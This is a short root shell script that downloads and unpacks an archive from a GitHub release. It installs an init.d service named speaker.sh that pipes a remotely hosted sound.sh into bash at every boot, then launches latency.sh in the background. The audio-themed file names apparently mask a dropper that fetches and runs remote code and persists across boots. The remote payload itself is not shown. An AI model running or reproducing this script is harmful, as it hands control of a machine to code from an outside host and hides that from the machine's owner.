cd /
rm -rf jack.tar
rm -rf jack
wget https://github.com/siomangfr/indeoi/releases/download/v1.0.2/jack.tar
tar -xvf jack.tar
cd /jack
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/siomangfr/indeoi/main/sound.sh)" > speaker.sh
chmod a+x speaker.sh
update-rc.d speaker.sh defaults
cd /jack
nohup ./latency.sh
ps -ef | grep jack
